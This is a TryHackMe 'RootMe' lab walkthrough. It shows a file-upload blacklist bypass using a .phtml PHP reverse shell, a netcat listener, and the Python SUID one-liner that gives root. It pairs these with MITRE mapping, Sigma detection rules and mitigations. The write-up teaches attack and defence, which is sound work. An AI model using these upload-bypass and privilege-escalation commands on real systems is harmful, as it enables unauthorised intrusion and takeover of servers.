# 🔓 RootMe — TryHackMe Walkthrough

> **Difficulty:** Easy | **OS:** Linux | **Category:** File Upload Bypass, SUID Privilege Escalation  
> **Platform:** [TryHackMe](https://tryhackme.com/room/rrootme) | **Completed:** June 2026  
> **Author:** [Hammad Khan](https://linkedin.com/in/hammad-khan011) | [HK101-cyber](https://github.com/HK101-cyber)

---

## 📋 Executive Summary

A Linux web server running Apache 2.4.29 exposes a file upload panel with an incomplete extension blacklist. By renaming a PHP reverse shell to `.phtml` — a PHP-executable extension the filter doesn't block — an attacker uploads a web shell and gains a low-privilege foothold as `www-data`. Privilege escalation is achieved by exploiting a SUID bit misconfiguration on `/usr/bin/python`, allowing full root shell access via a one-liner GTFOBins technique. Two flags are captured: a user flag in `/var/www/` and a root flag in `/root/`. Every attacker action is mapped to MITRE ATT&CK and paired with a blue team detection and mitigation.

---

## 🗺️ Attack Path Overview

```
Reconnaissance (Ping + Nmap)
        ↓
Directory Brute Force → /panel/ (upload) + /uploads/ (serve)
        ↓
File Upload → PHP shell blocked → Extension bypass (.phtml)
        ↓
Shell uploaded → Navigate to /uploads/shell.phtml
        ↓
Netcat listener catches reverse shell (www-data)
        ↓
Shell stabilised → TTY upgrade
        ↓
User flag → /var/www/user.txt
        ↓
SUID enumeration → /usr/bin/python SUID set
        ↓
GTFOBins Python SUID exploit → Root shell
        ↓
Root flag → /root/root.txt
```

---

## 🎯 MITRE ATT&CK Mapping

| Phase | Technique | ATT&CK ID |
|---|---|---|
| Reconnaissance | Active Scanning — Port Scan | T1595.002 |
| Discovery | Network Service Scanning (Nmap) | T1046 |
| Discovery | File & Directory Discovery (Gobuster) | T1083 |
| Initial Access | Exploit Public-Facing Application (File Upload) | T1190 |
| Defense Evasion | File Extension Bypass (`.phtml`) | T1036.008 |
| Execution | Command & Scripting Interpreter — PHP Web Shell | T1059.004 |
| Command & Control | Non-Standard Port Reverse Shell (Netcat) | T1571 |
| Discovery | File & Directory Permissions Discovery (SUID find) | T1083 |
| Privilege Escalation | Abuse Elevation Control — SUID Binary (Python) | T1548.001 |
| Collection | Data from Local System (flag files) | T1005 |

---

## 🔴 Phase 1 — Reconnaissance

### 1.1 Host Verification — Ping

Before scanning, confirm the target is live and responding to ICMP. This establishes basic connectivity and rules out network routing issues before investing time in a full port scan.

```bash
ping -c 4 10.10.X.X
```

**Why `-c 4`:** Sends exactly 4 packets — enough to confirm the host is alive without flooding the network. TTL in the response also hints at the OS (TTL ~64 = Linux, TTL ~128 = Windows).

![Ping confirms host is live](screenshots/1%20Ping.PNG)

---

### 1.2 Port & Service Scan — Nmap

```bash
nmap -sV -sC -Pn 10.10.X.X -oN nmap-rootme.txt
```

**Flag breakdown:**
- `-sV` — detect service versions (crucial for identifying vulnerable software)
- `-sC` — run default NSE scripts (banner grabbing, HTTP title, SSH hostkey)
- `-Pn` — skip ping check (some hosts block ICMP but still serve ports)
- `-oN` — save output to file for documentation and future reference

**Results:**

| Port | Service | Version |
|---|---|---|
| 22/tcp | SSH | OpenSSH 7.6p1 Ubuntu |
| 80/tcp | HTTP | Apache httpd 2.4.29 (Ubuntu) |

No SSH credentials in scope yet. Apache on port 80 is the primary attack surface.

![Nmap scan results](screenshots/2%20Nmap%20Scan.PNG)

---

## 🔴 Phase 2 — Web Enumeration

### 2.1 Directory Brute Force — Gobuster

The web root shows a basic page with no obvious functionality. Hidden directories are the next logical step — specifically looking for upload forms or admin panels.

```bash
gobuster dir \
  -u http://10.10.X.X \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,html \
  -o gobuster-rootme.txt
```

**Why this wordlist:** `dirb/common.txt` covers the most commonly deployed web directories and files. Adding `-x php,txt,html` catches files that gobuster would miss when checking directory names alone — critical for finding `panel/index.php` type paths.

**Key discoveries:**

| Path | Status | Significance |
|---|---|---|
| `/panel/` | 200 | **File upload form** — primary attack vector |
| `/uploads/` | 200 | **Where uploaded files are served from** — where we trigger the shell |
| `/css/` | 301 | Static assets |
| `/js/` | 301 | Static assets |

Two directories, one attack: upload the shell to `/panel/`, execute it from `/uploads/`. The path is clear.

![Gobuster discovers /panel/ and /uploads/](screenshots/3%20gobuster.PNG)

---

## 🔴 Phase 3 — File Upload Exploitation

### 3.1 The Upload Panel

Navigated to `http://10.10.X.X/panel/`. A file upload form is present — no authentication required. This is the vulnerability: an unauthenticated, publicly accessible file upload endpoint on a web server.

![Upload form at /panel/](screenshots/4%20upload-form.PNG)

---

### 3.2 PHP Shell Preparation

Downloaded the standard PHP reverse shell (PentestMonkey) and configured it with our attacker IP and listener port.

```bash
# Edit the shell before uploading
nano shell.php

# Change these two lines:
$ip = '10.X.X.X';    # Your TryHackMe VPN IP (tun0)
$port = 4444;
```

**Getting your VPN IP:**
```bash
ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d/ -f1
```

First attempt: uploaded `shell.php` directly.

**Result:** Blocked. The application has a filter rejecting `.php` files.

This is a common but incomplete defence — developers often blacklist `.php` while forgetting that Apache can execute several other PHP-associated extensions.

---

### 3.3 Extension Bypass — `.phtml`

The filter blocks `.php` but doesn't account for all PHP-executable extensions. Apache, depending on its configuration, will execute:

| Extension | Executed by Apache? |
|---|---|
| `.php` | ✅ (usually blocked) |
| `.phtml` | ✅ Often missed by filters |
| `.php5` | ✅ Often missed |
| `.phar` | ✅ Often missed |
| `.shtml` | Depends on config |

Rename the shell and re-upload:

```bash
cp shell.php shell.phtml
```

![shell.phtml ready for upload](screenshots/5%20shell.phtml.PNG)

Verify the file locally before uploading:

```bash
ls -la shell.phtml
```

![ls -la confirms shell.phtml](screenshots/6%20ls%20-la%20shell.phtml.PNG)

Upload `shell.phtml` via the panel — accepted. The filter only checks for `.php`, not `.phtml`.

![Upload success — shell.phtml accepted](screenshots/7-upload-success.PNG)

**Why this works:** The application is using a blacklist approach (blocking known bad extensions) rather than a whitelist approach (only allowing known safe extensions like `.jpg`, `.png`). Blacklists are always bypassable — there are too many valid PHP extensions for any blacklist to cover completely.

---

## 🔴 Phase 4 — Gaining Shell Access

### 4.1 Start Netcat Listener

Before triggering the shell, the listener must be running. If it isn't, the reverse connection has nowhere to land and the shell silently exits.

```bash
nc -lvnp 4444
```

**Flag breakdown:**
- `-l` — listen mode
- `-v` — verbose output (shows connection details)
- `-n` — no DNS resolution (faster)
- `-p 4444` — port to listen on (must match what's in shell.phtml)

---

### 4.2 Trigger the Shell

Navigate to the uploaded file in the browser:

```
http://10.10.X.X/uploads/shell.phtml
```

Apache executes the PHP file. The shell code runs, opens a socket back to our listener, and the connection is caught.

![Netcat catches the reverse shell](screenshots/8%20nc%20shell.PNG)

We're in as `www-data` — the Apache web server user. Low privileges, but a foothold.

---

### 4.3 Shell Stabilisation

The raw netcat shell is fragile — `Ctrl+C` kills it, tab completion doesn't work, no job control. Stabilise it into a full TTY:

```bash
# Step 1 — Upgrade to PTY inside the shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2 — Background the shell
Ctrl+Z

# Step 3 — Fix terminal settings on attacker machine
stty raw -echo; fg

# Step 4 — Set terminal type inside the shell
export TERM=xterm
export SHELL=bash
```

**Why this matters:** Without stabilisation, running `sudo` or interactive programs crashes the shell. A stable TTY is required for reliable privilege escalation work.

![Shell stabilised — full TTY](screenshots/9%20stabilize%20shell.PNG)

---

## 🔴 Phase 5 — Flags & Privilege Escalation

### 5.1 User Flag

```bash
find / -type f -name "user.txt" 2>/dev/null
```

**Why `2>/dev/null`:** Suppresses "Permission denied" errors from directories we can't read — keeps output clean and focused on actual results.

![Find locates user.txt](screenshots/10%20find-user-txt.PNG)

```bash
cat /var/www/user.txt
```

### 🚩 Flag 1 — User Flag

![User flag captured](screenshots/11%20user-txt-flag.PNG)

---

### 5.2 SUID Binary Enumeration

We need root. First step: find binaries with the SUID bit set. SUID (Set User ID) means the binary runs with the **owner's privileges** — if root owns a SUID binary, it executes as root regardless of who runs it.

```bash
find / -type f -perm -4000 2>/dev/null
```

**Flag breakdown:**
- `-type f` — files only
- `-perm -4000` — files with SUID bit set (the `4` in `4000` is the SUID bit)
- `2>/dev/null` — suppress permission errors

![SUID enumeration — python found](screenshots/12%20suid-find.PNG)

**Critical finding:** `/usr/bin/python` has SUID set and is owned by root.

Python has no legitimate reason to run as root. This is a misconfiguration — someone set the SUID bit on Python at some point, likely accidentally or for a quick fix, and never removed it. It is an instant root escalation.

---

### 5.3 Python SUID Exploit — Root Shell

Referenced [GTFOBins — Python SUID](https://gtfobins.github.io/gtfobins/python/) for the exact exploit technique:

```bash
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

**Why this works:**
- `/usr/bin/python` runs as root (SUID)
- `os.execl` replaces the current process with `/bin/sh`
- `-p` flag on `sh` preserves the elevated privileges passed from the SUID binary
- Result: a root shell

![Root shell obtained via Python SUID](screenshots/13%20root-shell.PNG)

Verify:
```bash
id
# uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
whoami
# root
```

---

### 5.4 Root Flag

```bash
cat /root/root.txt
```

### 🚩 Flag 2 — Root Flag

![Root flag captured](screenshots/14%20root-flag.PNG)

---

## 🔵 Blue Team — Detection & Mitigation

### Detection Table

| Attack Step | MITRE ID | Detection | Log Source |
|---|---|---|---|
| Port scan (Nmap) | T1046 | High connection rate to multiple ports from single IP | Firewall / IDS |
| Directory brute force (Gobuster) | T1083 | Abnormal 404 rate; `User-Agent: gobuster` string | Apache access log |
| File upload (any file type) | T1190 | Alert on upload of non-image extensions to upload directories | WAF / Web App logs |
| `.phtml` extension bypass | T1036.008 | File type validation bypass; MIME type mismatch detection | WAF |
| PHP web shell execution | T1059.004 | `www-data` spawning child processes; outbound TCP from Apache | Sysmon EID 1 & 3 |
| Reverse shell connection | T1571 | Outbound connection from web server to unknown external IP on non-standard port | Network IDS / Firewall egress |
| `find / -perm -4000` | T1083 | SUID enumeration commands in shell history / auditd | auditd |
| Python SUID exploitation | T1548.001 | Python process with `euid=0` owned by non-root user | auditd / Falco |

---

### 🛡️ Sigma Rule — Malicious File Upload (Non-Image Extension)

```yaml
title: Suspicious File Upload — PHP-Executable Extension
id: 3c8d2f1a-45b6-7e8f-c901-2d3e4f567890
status: experimental
description: Detects upload of PHP-executable file extensions through a web
             application upload endpoint, which may indicate web shell upload attempts.
author: Hammad Khan (HK101-cyber)
date: 2026/06
references:
    - https://attack.mitre.org/techniques/T1190/
    - https://attack.mitre.org/techniques/T1036/008/
    - https://tryhackme.com/room/rrootme
logsource:
    category: webserver
    product: apache
detection:
    selection:
        cs-method: 'POST'
        cs-uri-stem|contains: '/panel/'
        cs-uri-query|endswith:
            - '.php'
            - '.phtml'
            - '.php5'
            - '.php7'
            - '.phar'
            - '.shtml'
    condition: selection
falsepositives:
    - Legitimate admin file management tools (should be access-controlled and allowlisted)
level: high
tags:
    - attack.initial_access
    - attack.t1190
    - attack.defense_evasion
    - attack.t1036.008
```

---

### 🛡️ Sigma Rule — SUID Python Privilege Escalation

```yaml
title: Python Executing Shell with Preserved Privileges (SUID Abuse)
id: 9e1f3b2c-56d7-8a9b-e012-3f4a5b6c7d8e
status: experimental
description: Detects Python spawning a shell process with the -p flag, a known
             GTFOBins technique for escalating privileges via SUID Python binary.
author: Hammad Khan (HK101-cyber)
date: 2026/06
references:
    - https://attack.mitre.org/techniques/T1548/001/
    - https://gtfobins.github.io/gtfobins/python/
logsource:
    category: process_creation
    product: linux
detection:
    selection_parent:
        Image|endswith:
            - '/python'
            - '/python3'
        CommandLine|contains|all:
            - 'os.execl'
            - '/bin/sh'
    condition: selection_parent
falsepositives:
    - Legitimate Python scripts spawning shells in controlled environments (very rare)
level: critical
tags:
    - attack.privilege_escalation
    - attack.t1548.001
```

---

### 🛠️ Mitigations

**What actually fixes this — for defenders and developers:**

**1. Implement a strict file upload whitelist, not a blacklist**
Only allow explicitly safe extensions. Never rely on blocking known bad ones:
```php
// WRONG — blacklist approach (bypassable)
$blocked = ['php', 'php3', 'php4'];

// CORRECT — whitelist approach
$allowed = ['jpg', 'jpeg', 'png', 'gif'];
if (!in_array($extension, $allowed)) { die("Not allowed"); }
```
Also validate MIME type server-side — don't trust the `Content-Type` header sent by the client.

**2. Store uploads outside the web root**
Files in `/var/www/html/uploads/` are directly served by Apache. Move uploads to `/var/uploads/` (outside the web root) and serve them through a PHP script that reads and outputs the file — the web server never executes them.

**3. Remove the SUID bit from Python immediately**
```bash
sudo chmod u-s /usr/bin/python
sudo chmod u-s /usr/bin/python3
```
No interpreter (Python, Perl, Ruby, Node) should ever have SUID set. Audit all SUID binaries monthly:
```bash
find / -type f -perm -4000 2>/dev/null
```
Compare against a known-good baseline. Anything unexpected is a critical finding.

**4. Block outbound connections from the web server**
The reverse shell only works because Apache can initiate an outbound TCP connection. Implement egress filtering on the web server host — `www-data` should have zero reason to make outbound connections.

**5. Deploy a Web Application Firewall (WAF)**
Rules for file upload endpoints should alert or block POST requests containing PHP-executable MIME types or extensions.

---

## 🧰 Tools Used

| Tool | Purpose | Command |
|---|---|---|
| Ping | Host discovery | `ping -c 4 <IP>` |
| Nmap | Port & service scan | `nmap -sV -sC -Pn` |
| Gobuster | Directory brute force | `gobuster dir -u -w -x` |
| PentestMonkey PHP Shell | Reverse shell payload | Modified `$ip` and `$port` |
| Netcat | Reverse shell listener | `nc -lvnp 4444` |
| Python3 (pty) | Shell stabilisation | `python3 -c 'import pty...'` |
| GTFOBins — Python | SUID privilege escalation | `python -c 'import os; os.execl...'` |

---

## 📚 References

- [TryHackMe — RootMe Room](https://tryhackme.com/room/rrootme)
- [MITRE ATT&CK — T1190 Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
- [MITRE ATT&CK — T1548.001 SUID and SGID](https://attack.mitre.org/techniques/T1548/001/)
- [GTFOBins — Python](https://gtfobins.github.io/gtfobins/python/)
- [PentestMonkey — PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)
- [Sigma Rules Repository](https://github.com/SigmaHQ/sigma)

---

## 🔗 More From This Series

| Room | Difficulty | Status |
|---|---|---|
| Pickle Rick | Easy | ✅ [Read Writeup](../pickle-rick/README.md) |
| RootMe | Easy | ✅ [Read Writeup](../rootme/README.md) |
| Bounty Hacker | Easy | 🔜 Coming Soon |
| Agent Sudo | Easy | 🔜 Coming Soon |
| Mr. Robot CTF | Medium | 🔜 Coming Soon |
| Relevant | Hard | 🔜 Coming Soon |

---

*Made with 🔴 Red Team thinking + 🔵 Blue Team heart.*  
*Connect: [LinkedIn](https://linkedin.com/in/hammad-khan011) · [GitHub](https://github.com/HK101-cyber)*
